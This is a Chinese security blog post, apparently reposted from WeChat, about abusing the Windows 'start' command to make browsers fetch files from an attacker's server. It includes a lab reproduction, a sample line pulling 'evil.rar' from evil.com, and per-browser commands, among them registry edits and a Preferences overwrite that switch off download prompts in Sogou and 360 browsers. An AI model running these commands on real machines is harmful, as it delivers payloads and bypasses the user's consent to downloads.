<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JzbyxfOQ0pA-cQdzfztkhg)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

免责声明

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

start 命令

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

在 Windows 的 CMD 命令行中，start 命令用于启动一个新的命令行窗口或打开一个新的程序。

start 命令的用法：

*   start """C:\Some Path\myfile.txt"：这将会用默认程序（在这个例子中，可能是记事本或 Word 等）打开这个文件。
    
*   start """C:\Program Files\My Program\program.exe"：这将会启动指定的程序。
    
*   start """http://www.example.com"：这将会打开默认的网页浏览器，并导航到指定的网址。
    
*   start：直接打开 cmd
    
*   start chrome：打开处于环境变量中的程序
    

尝试直接执行 "start"，打开了一个新的 cmd 窗口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6LjrhfcFScmibFM9W7ARPaVevic61zaJwicXJkhVLgYp20uAaxaYsWKhrTSkY4fg/640?wx_fmt=png&from=appmsg)

尝试执行 "start chrome"，将打开谷歌浏览器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6LjrhfckOrEqtxWAKGXReZXUL64f65klibtAw2FBjXy62CICiaiavFnO1OhkmQGw/640?wx_fmt=png&from=appmsg)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

通过浏览器下载文件  

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

我们输入 "start chrome" + url，就会控制谷歌浏览器并打开 url  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6Ljrhfca4omLIfib6bg2QemCsshdvuyYjcfrkwicdqb5WBBd9icY6PtgicyYaPtNg/640?wx_fmt=png&from=appmsg)

并且，**浏览器有一个特性：我们通过浏览器打开特定后缀的文件时，浏览器会自动帮我们下载到本地。**

因此，执行类似 "start chrome http://evil.com/evil.rar" 之类的命令，浏览器就会下载 evil.rar 至本地。  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

复现

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.  找台机器准备好恶意文件，并打开 http server 监听端口：
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6Ljrhfchg67ic4tcMEgGdhBA2j6aqjePHxuLZsfJFceNFriaZVlerYibnf2g59mA/640?wx_fmt=png&from=appmsg)

2. 受害者机器执行 "start chrome http://172.18.207.162:7894/fatmo.jpg"，没有下载文件，说明 jpg 格式不会自动下载  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6LjrhfcfUbJOUVUT8htjwMknibOEjStO8XKpyhlpD2UUhnFxKyJ4CymyAgM4cQ/640?wx_fmt=png&from=appmsg)

3. 受害者机器执行 "start chrome http://172.18.207.162:7894/fatmo.rar",rar 格式文件会自动下载，复现成功：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BG46e6Sicc751KTR6LjrhfcYib0J63d2KvDjC02UDqCNaCJicYIIJ83h3fnwD0hN8sQKFSzkalu87wg/640?wx_fmt=png&from=appmsg)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

常见浏览器下载方式总结

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

chrome 浏览器下载较为简单，而有些浏览器则会涉及到一些复杂操作才能完成下载，现在总结几个常见浏览器的下载方式：  

*   **msedge**
    

```
start msedge http://192.168.1.1:6789/demo.rar


```

*   **firefox**
    

```
start firefox http://192.168.1.1:6789/demo.rar


```

*   **chrome**
    

```
start chrome http://192.168.1.1:19900/6789.rar

```

*   **搜狗浏览器**
    

```
reg add "HKCU\Software\Sogou\SogouExplorer\Downloader\Download" /v DirectDownload /t REG_DWORD /d 0x1 /f
reg add "HKCU\Software\Sogou\SogouExplorer\Common" /v SlienceDownloadEnabled /t REG_DWORD /d 0x1 /f
start "C:\Program Files (x86)\Sogou\SogouExplorer\SogouExplorer.exe" http://192.168.1.1:6789/demo.rar

```

*   **360 安全浏览器**
    =============
    

```
# 查看当前 prompt_for_download 配置：
type "C:\Users\Administrator\AppData\Roaming\360se6\User Data\Default\Preferences " | findstr prompt_for_download
# 覆写配置文件：
echo {"download":{"intro_suda_show":true,"prompt_for_download":false\}\} > "C:\Users\Administrator\AppData\Roaming\360se6\User Data\Default\Preferences"
# 使用360安全浏览器下载文件：
start C:\Users\Administrator\AppData\Roaming\360se6\Application\360se.exe http://192.168.111.1/123.rar

```

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

参考文章

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

*   https://xz.aliyun.com/t/12953
    
*   https://mp.weixin.qq.com/s/b3NNiXk7tFJPtq3yuWc7pQ
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9B7vZdL5TFiaHdDq5o1RLL1ja6dE33eaySFgeGz1d7As5DibPIUNnwgx7eKPcVEz8FwFTB1ygqOdgbg/640?wx_fmt=png&from=appmsg)